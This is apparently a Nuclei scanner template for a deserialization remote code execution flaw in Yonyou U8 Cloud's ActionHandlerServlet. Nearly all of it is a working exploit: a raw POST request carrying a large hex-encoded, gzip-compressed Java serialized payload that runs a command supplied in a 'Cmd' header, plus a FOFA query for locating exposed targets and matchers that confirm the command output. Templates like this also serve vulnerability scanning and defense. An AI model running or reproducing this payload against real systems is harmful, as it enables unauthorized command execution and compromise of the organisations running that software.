id: u8cloud_actionhandlerServlet_rce

info:
  name: u8cloud ActionHandlerServlet 反序列化RCE
  author: Xc1Ym
  severity: critical
  description: u8cloud ActionHandlerServlet 反序列化RCE
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="用友-U8-Cloud"
  tags: rce,OA,u8cloud,hw

variables:
  cmd: "whoami"


http:
  - raw:
      - |
        POST /servlet/~ic/com.ufida.zior.console.ActionHandlerServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 14712
        Cmd: {{cmd}}
        Accept-Encoding: gzip, deflate
        Connection: close

        {{hex_decode("1F8B080000000000000095590B7C14F59DFFFE763799C966F26021810503E121E6B9018C296C108100124D02120442F031D94C9285CDCE323B1B12B4A7ADF43CABF55151443D6C6D6D7AF5D16865897250A8A7F6B4F5FABAD66BEFD1BB5EEFBCBBD6DAF31EBDF60AFDFD6677934D58B4DDE4F37FFEDEAFFF7F669EF939F2E21666ECD587F440C20E47029BF5F840A761BFBCE1130F3D3C7EA2D10D0CC70E6800E8AAB5901F317CA369F507F4981E1A3002217370D08CC6B98F448C901D96F13E6364488F248CC0F6B0D1DBAEC736466D6BE493CF7EE7B1556717FCC805571BDC0C62C3D7268C1B227AB4BF614BCF5E466FE6AD413D66A324B52532353085E6615E73F7992673AFF910EE8C1F68D30F8E305AF4A7873F7E6CA4F4B01BD406A54F0FD9A6C57CEBDA9844438A44439A4443168986ED961E8DF799D6A0613167E619FC109E7D89A8D08E075A06F470D4E8CD22B0ECF5233FAB3A78C4E30275A3289CB513B751DFFD878992B0D2281F244C36CAA91D35BF7CBB71CE51973892DDA7B032CDBFB7323CB3F5A89D4570D7D0FD33D6B99E3FEC128B16843310FBF147700FC786D2DE19340F8623113D203E8C87AC70CC0E6C30FAC2D170B4BF25A2C7E36DA6DE6B5898FCFD61466E8D0E99FB0C2B4BAC3BDF39BFEF965BDF5AE982BB1B79E175563F1B776677AEF82A0CB71BF680D9DBA10F1A5343B0D3B658C0E66E06D9AA5BFAE0F69198C1647CD9641CF1538E48930FC87A204DFEFEB7763D511AAF8E64CC4D0CE7CB864BE13F5DFE83E7DEFCE6EE09AFC04679BF616F304211DD327A1DAB5A09513621969D2B94869C515CDA99CEEA1C877E66C4240AA3C68156C71F21631ADE9C69782E1BAE758D2C9CAB7BFD33EFCFFE55BEBAFDC76961665FF7C6B9974F33CC72DAE745053EEDC5063C28CD61993EA4E2612FE6E188178FE0A8348F2A784CB61F57718F1795F85315C7543CA1E0332A3EABE249059F1384CFAB784AC517148C16A21C5F94E6CF547C49C5D30A9E118067153CE7C59731A6E279052FA8F88A97A57D51481E57912CC0529C5030EEE5FE25152FCBE649C1FB7315A7149C96E157559C517056C5D754BC220B7FA1E05591ED352F5EC749155F176A7FA9E20DE9DF54F10DE9BF29CD5B2AFE4AFA6FA9F8760193FE8EF0F9AE34DF93E95F2BF8BE10FA81346FABF8948ABF11097EA8E2475EFC2DFE4E70FF5EC53FA8F8B18A7F54F04F5E6C15DB6DC54F54FCB3F43F55F12F2AFE55C53B2AFECD8B7FC77F48F333053FF7E25DFCC28B6EBCA7E297D2FFA734EF4BF35FB2F7DFD2FC8F170D42E37F85D3AF54FC9F60FF5AC16F44C6FFF7228CDF4AF30B813D2723A739EF251049E3F2929B3CD2E4E5A5B36E052B43F98C400AC392AA52013321AF4A852A69AC1E1529544C708563942B53089E9869D98499597BAD51DBE8E7CA43C85FCD196FAF21B8ABAA77306C8BD96B1057762E901D89C11E4E60BD27C22BDE8DC32123E6E438A120C2B5C1C912C2A55517F2ACBE2019098A316C841236935AFA211893820B0A635AC6101762C65C95033387563989B9AD4494D5E8341356C8D814169D94758D4EF5D370070E695442A51ACD209F46336916EFDA0396A1F7C6352AA37285666B3487FC1ACDA57934B56A6D77E09A35BA842A349A4F0B58F201DB6677E4DBBAC52583FD3209BD2D118DA64C9A6F0F84E34B9631A7013DDA1B312CC2FC49B80EB333111AD8143622BD13A6D7A85224CBEF8F983D7A84B5895966C888C7B9DE128A270FE3B670DCD668212D1271178BEEC67E42218BB2CD88C7D885E2E2692ED268095D4A289D5E8D155AAAD16554C55E67FCCD861C0A53C052166626A1C15E0D9FC4DD1A55530D83C70DBBD3D6ED0493AEA53A4ADD60A6788A0D4FF5842559678A6D0E86743B75CFE949F405D68FD846CB4022BA4FC39FE02E8D02D4405099B46CB0D65C1B355A26922BBDE64E2B2C01367392D184E9D2AB8168D87468AE4FF4F589229E03961ED36839EE22544E334987696F3213D16CFBAFA0CB156A2440A32BA889ED2067207BAF326ADA95D14424A2D147A88290B7587E1AADA4551A0589E38F821AADA62B098B3228E9B0AE1C30E376A51C91BA5D695896692DD4701B6ED7680D5DA5D15A5AA7E163F8F8149BA7424ECCC7DAB7E010335C2B3F0DF7E06E3685190F44F9E8546883461BC5239B4428F7817054CA81E32E573D8F674F77E3FA4438C20ED6E86ADACC442BEBA3958D1AB50AB6AB21E4ACD895ACBF2B3E2024420A5DA3D1B5D4C68CA93DE36227063B437A346A580A7568B485B68AACD731CA1E5DA36DD4A9D176BA5EA31D92313B79977689124A434F38DA101F10E02E9E724405B80608F1DD99888D1A7643A719DA67708477738433E81E8D6EA01B35BA89AE57E8668D7409FC1E5AA45048A35EAAD7C890FCEEA37E8D06642F2CCC2A32F64F17A694EDEB2A07E3FD95F56B34DA2B4A731261E67440731F7BE853B897E47C261485129665F00DCC710A615655F585D581F393D32735B9DA32135C1DFC39E09C2D065619385D606756E52AA7A5595711A74810EA3FA4AE5A469F5CD31A1CF0E629CE9FB2C51A717EAD0B4965093B95CA53B55B0E07B753CBA694EFF495AAFAC225761F83CB056EBA45264AB21A32A3365FC559C979D944F97E6E751AFB1306DF919AABD9F3454CA9331133AC50CA249E78F8A0E11C59AD84B2AAD69CECA55CA56E9184B5394C73E18D3197B1521498DC9C8BED713D0E3B77DD69E7535A901CF7DB9CE28AC7D335CD5355DDBD9EBBED5D5B37724EE5F0BE87756687645F26A75B7982F08CAC48C948AC70B949B9A64C028DDD600CDB59B7FEE9C199B5C514CB726EB01DD8677A242E2EC9A134FBD1C3961FE4638B25B6ECF8CEB03D300D3613B5BB9D533F16D145AF0D178D8D8BC64CAE68CB8BC722618EDFCB7231ECCE199F319DD39ECFAA8B48C9C1A738CFD05BFA08E553C370F286353B1B3573FA378BFBF21C3B4C3D4C47E2B631983AABB75A2687BC3DC233DB6C330F18568B2E2777BE1E8B19D1DF23E1A79474D1C7363387F58C2922D9610905AFDC0F3293B229FE4F2F338DAAAA1CA6CA06DD9ABA92344FE1915E4C15C1D6682CC137032E7783629D3472D86CC8DA9084ABCAB92186D31271638311090FF2716F5DC4A359EF26D24751B373D38A7770A83BB5430232EA4C44AA8D52FD335229BDFC506999231771FC8E0FE439CD0C6A386AEF90289118B910C949E41216604BC2CEB2CB9C2CBB64EF3804E32D11336EF4666E3A532DC4958F17C391D425D3933E9372D1E2083C90BA31E5F5451272A2E7C523861193FA728D8855600C8733B2E78584672A4ADA5933BDDFC0427EB8AA008B0F17FFF19D459E5AE5B2C27D3EAFF3B59AE79F00DC6F43C50CDE7CA4E604681CAE24DC6DB549787C7949E4B7D7799250EA78AE9E4101FF77B89B3C659EFAD34FBAF6D697795604F3FC79AF237FD4B5C3CFE0DE60BE3FDF579884F6288A7854E48C7877A5EC7A7CC5931465410D2A7EE52C4A1C9032BF2220A559204A1A44D667C8FA28CA83AA334F6226FFA7562F8496AD592984D234426A9E8370D9B4F533283F236CDC4D0565057EF525CC263C49A65F2D2B7809735C087AFD5EC1F367E179855EA1BF50D6E7BA4F615E1297F80B795091C4FCA096DA58E0E18D2EB7AFB2D3D9E55905CF16F26CFE1954068BFC4562489CAFF1B3D91625B13858ECD70471490AF1055CEA606A29CC9358DA35035F3F81CB84C2CE1A5F5512D5C1127F491235AC5B89AF363FC5AFAEB3CB23B85D79290AF57E25DFA1E02FE61D21E316225D7932F4179FCE504C310FA498FB4BB279FB150762145B822535BE65C2B8D45FEA5BEEC970142EA59E0C17318232955C694E72B30F15D0E8B9BB47D99A6C09F7210F8DFEF6A1E7393E8FE0493C051F5EC577F17DF8E8946BB9AB919FE79BD0ECBA87FB35E872FA3DB8D5E96F73DD2EBDEB0ED75DCE9CF0C71CF7EFA2995B2F3C28E43F0D6528C25C14F3F37F2996710E346126539A858DBCB307E5E8C76C44300736FC9C4173F9016A1EEEC3252CCD7C9667214BB400A3A8C43816E11416B37497B27C552CE152BC8DCBF01354E31DD4E03DD4E237E0C72CD4533102548106AAC232BA1CCB692556D05A5C4E5D68A4DB70051D4213DD8995F469ACA25368A657B19ABE812B5D2558E35A8E16D6FA2A5713D6BAD6609DEB46AC77DD8E0DAE3B1070DD8556D67493EB5E6C763D8052D7115C8B3B595B0FEB2EFAF3135A2ADFB18A7B37F7336AC7B162ACDDC9F8464EF02BC6184C10F27079DA60C50EE0565EB98E8BC6B60982B2CF4F93DC0AC1E3BCE6E17EB0F63568BE2626F591A3C8F7AD1CE3D1AAB65A5F3089E6A358C3035F5312AB7D5726B1A6BDEE74DE130C74D5584D9D7BC571ACADA9F3AC18C7BA71AC3F8E9693D8D0C5D56863477D129B7C578FD54CE06E76BA245AC7E4DD9C2364137B11D8C56D17FBB1DBF1DD7CDC803ADC8815B8095740C76AF4A0152156A1173B6030643F63DF935181DE60050AB8AFF15D338E6B93686B7764A70E0A7AEA7CED5CC68E626DADAFC31954D6FAB638856DF6496CED3A81EB18769B8F43785B12DBDB38B72A9DBCEEF2F8AEE7ACAAED0C7A4671E50723EF988ABC539077A591C7D1E5E732B3BBE324BABBD8207B4EE006DF8D49DC24B537899B8FA2507A7D1479BEA6607E1AAA67122ACDC89FCF4C2EC4487196C21D54EA5F83C2B821BF329622DE1BCC9F58CB1F0BAA1313F5AB6CB107718E0A38BAA4AF60EB1590CFE92B6881F469FF44396B807D6CDF0807D420FB28CA7966721EC510C07EAC479CFD91608821CEB261A6760B1EC7AD780E1FC5D7F814FB1EAFFE9ACFAF73FC64C8114CF9B89DB97E8C0AF9C1DBC76BE5BC3697C7153C5ECCDE2479FE4BFBF50E9652BEBEBC9FF1ABE3CB47517A92EDEC334EA0AF631445CEA45F266C6B566F20C86531DC555B97C4DE13D8C7A660FBEF611371D7C3958C0D13E163856783C1029945F950E0CE7C14378B9563C750EAF7CA687F12D6E8F977E560492F2A938B6A7AB1404699453E4AE2FE026E66C11EC7903039B0530A62E1E8F963320B09A7612E3B1D69BFFA46D8852CF54109A45B52EE1CF3DD3AC6693E8ED338CB0E02BEC585A9618A43EE6547DCC7578407B8503DC8E5EF3097BE87D08987395D8E208C47D83547D9FC8F31CEE30C718C474FE08BF82C9EE5E2F7023EC7D49F62FA5F600EA37885775EC397F0269E665ECF31B767D871CF72E9FB3273BD8F2F1BA95A51C31545AA4C714DCD8B9CF42FA225898FEE7C7E2258BC2C35F02227F3715EB9DFB9B43C60A3B0573E7F18CE23CDC4AB79D79095BA9FA73E0DA42E6D9F79EFF32B0F367F65BDF336DE79775F95F39DBF10800C2E997CD52F83F917FF4220834553A19738D0254E0BE73B1FD2DFF9307CE187C1763D96A7FCF0EC2BE5377FDB0DD72678E55DED26E7AB5A2B0AE49D667CC08CF40EC7D2344A0FA8D23AD486877F075694BF116D1C0000")}}

    matchers:
      - type: word
        words:
          - administrator
          - system
          - iis
        condition: or
# digest: 490a00463044022032b12e1921a1c2db76d0633dc61bb3f92c58a9c16d03c214e30899d89127fe28022077695440706e803c3398b36e3ff2060cc0594f6ce35f2fe2367296dc3ff6c36b:6b2dd5af372f02ed15a56faf8ad98cf9